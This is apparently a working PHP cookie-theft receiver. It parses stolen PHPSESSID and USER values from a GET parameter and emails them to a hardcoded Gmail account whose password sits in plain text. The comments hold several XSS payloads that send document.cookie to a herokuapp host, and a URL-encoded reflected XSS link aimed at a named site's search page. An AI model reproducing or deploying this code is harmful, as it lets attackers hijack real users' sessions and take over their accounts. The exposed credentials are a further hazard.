<?php
include 'PHPMailer/class.smtp.php';
include 'PHPMailer/class.phpmailer.php'; 

if (isset($_GET["abc"])) {
    $cookie = $_GET["abc"];
    $sessionid = "";
    $user = "";
    $arr = explode(";", $cookie);
    $arrlength = count($arr);
    for ($x = 0; $x < $arrlength; $x++){
        if (strpos($arr[$x], "PHPSESSID"))
            $sessionid = explode("=", $arr[$x])[1];
        if (strpos($arr[$x], "USER"))
            $user = explode("=", $arr[$x])[1];
    }
    
    
    $mail = new PHPMailer();
    $mail->IsSMTP();
    $mail->CharSet = "utf-8";
    $mail->SMTPDebug = 0;
    $mail->SMTPAuth = true;
    $mail->SMTPSecure = "ssl";
    $mail->Host = "smtp.gmail.com";
    $mail->Port = 465;

    $mail->Username = 'ahbcgd590@gmail.com';
    $mail->Password = '102102102';
    $mail->SetFrom('ahbcgd590@gmail.com', "me");
    $mail->AddReplyTo('ahbcgd590@gmail.com', 'Admin');
    $mail->Subject = '';
    $mail->MsgHTML("sessionid : ".$sessionid." user : ".$user);
    $mail->AddAddress('ahbcgd590@gmail.com', 'me');
    
    $mail->Send();

//     header('Location: http://matxac.com/');
    


//     $f = open("log.txt", "a" );
//     fwrite( $f, date("Y-m-d h:i:sa").":\n".$cookie."\n\n");
    
    echo '<img src="67586673.jpg" alt="hello!"  style="width: 100%; height: auto;">';

//document.location="https://yeuvephp.herokuapp.com/abc.php?abc=" + document.cookie;
//var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("[style="display:none;"]").appendChild(elem);
//$("#top_banner").after('<img style="display: none;" src="https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie + '" />');
//window.open( "https://yeuvephp.herokuapp.com/abc.php?abc=" +document.cookie, "_blank");
    //document.querySelector(".example");
//var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("footer").after(elem);
 //USER PHPSESSID
    //  hay!"><script>var elem = document.createElement("img");elem.setAttribute("src", 'https://yeuvephp.herokuapp.com/abc.php?abc=' + document.cookie );$("footer").after(elem);</script>
   // hay!"><script>document.location="https://yeuvephp.herokuapp.com/abc.php?abc=" + document.cookie;</script>
//     http://matxac.com/index.php?go=search&keyword=%22%3E%3Cscript%3Edocument.location%3D%22https%3A%2F%2Fyeuvephp.herokuapp.com%2Fabc.php%3Fabc%3D%22%20%2B%20document.cookie%3B%3C%2Fscript%3E&type=song#ListSearch
}
?>
